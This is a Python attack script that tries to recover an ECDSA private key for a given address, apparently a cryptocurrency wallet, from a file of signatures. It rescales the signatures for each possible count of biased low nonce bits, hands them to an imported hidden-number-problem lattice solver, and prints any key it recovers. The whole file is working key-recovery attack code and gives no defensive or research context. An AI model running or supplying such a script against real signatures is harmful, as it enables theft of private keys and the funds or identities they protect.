import json
import sys
from lattice_nonce_analyzer import solve_hnp, verify_key, P

def try_lsb_lattice(filename, address):
    with open(filename, "r") as f:
        sigs = json.load(f)
    
    print(f"Loaded {len(sigs)} sigs from {filename}")
    
    # Use fewer sigs for speed
    subset_n = min(len(sigs), 60)
    
    for b in range(1, 160):
        if b % 32 == 0: print(f"Trying LSB bias_bits={b}...")
        
        inv_2b = pow(2**b, -1, P)
        
        fake_sigs = []
        for i in range(subset_n):
            fake_sigs.append({
                'r': (sigs[i]['r'] * inv_2b) % P,
                's': sigs[i]['s'],
                'z': (sigs[i]['z'] * inv_2b) % P
            })
            
        key = solve_hnp(fake_sigs, b, address=address)
        if key:
            print(f"!!! SUCCESS at LSB bias_bits={b} !!!")
            print(f"Private Key: {hex(key)}")
            return key
    print("No LSB bias found.")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 try_lsb_lattice.py <sigs.json> <address>")
    else:
        try_lsb_lattice(sys.argv[1], sys.argv[2])
